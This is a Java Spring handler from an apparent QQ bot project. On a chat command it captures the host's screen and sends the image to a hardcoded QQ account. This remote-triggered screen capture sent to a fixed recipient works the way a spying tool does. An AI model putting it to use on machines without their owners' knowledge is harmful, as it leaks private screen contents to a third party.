package com.manage.qq.service.socket.qq;

import com.manage.qq.config.Config;
import com.manage.qq.enums.CommandEnum;
import com.manage.qq.gateway.QQGateway;
import com.manage.qq.model.qq.QQInteractiveDTO;
import com.manage.qq.model.qq.QQMessageBO;
import com.manage.qq.model.qq.QQMsgSendRequest;
import com.manage.qq.util.SystemUtil;
import lombok.extern.slf4j.Slf4j;
import org.apache.commons.lang3.StringUtils;
import org.springframework.stereotype.Component;

import javax.annotation.Resource;
import java.util.Optional;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

@Component
@Slf4j
public class ShotScreenReplayMsgHandler extends QQMsgHandler {
    @Resource
    private QQGateway qqGateway;
    @Resource
    private Config config;

    static final ExecutorService executor = Executors.newFixedThreadPool(5);

    @Override
    public void handleMsg(QQMessageBO qqWsMessage) {
        if (qqWsMessage.getMessageId() == null) {
            return;
        }

        String content = Optional.of(qqWsMessage).map(QQMessageBO::getContent).orElse(null);
        if (StringUtils.isBlank(content)) {
            return;
        }

        if (CommandEnum.COMMAND_SHOOT_SCREEN.judgeCommand(content)) {
            executor.submit(() -> {
                String screenshotPath = SystemUtil.takeScreenshot();

                QQMsgSendRequest qqMsgSendRequest = new QQMsgSendRequest();
                qqMsgSendRequest.setMsgId(qqWsMessage.getMessageId());
                if (screenshotPath == null) {
                    qqMsgSendRequest.setContent("截屏失败");
                    qqGateway.sendMsg(qqMsgSendRequest, "634091544");
                } else {
                    qqMsgSendRequest.setContent("截屏成功");
                    qqGateway.sendMsg(qqMsgSendRequest, "634091544", screenshotPath);
                }
            });
        }
    }
}
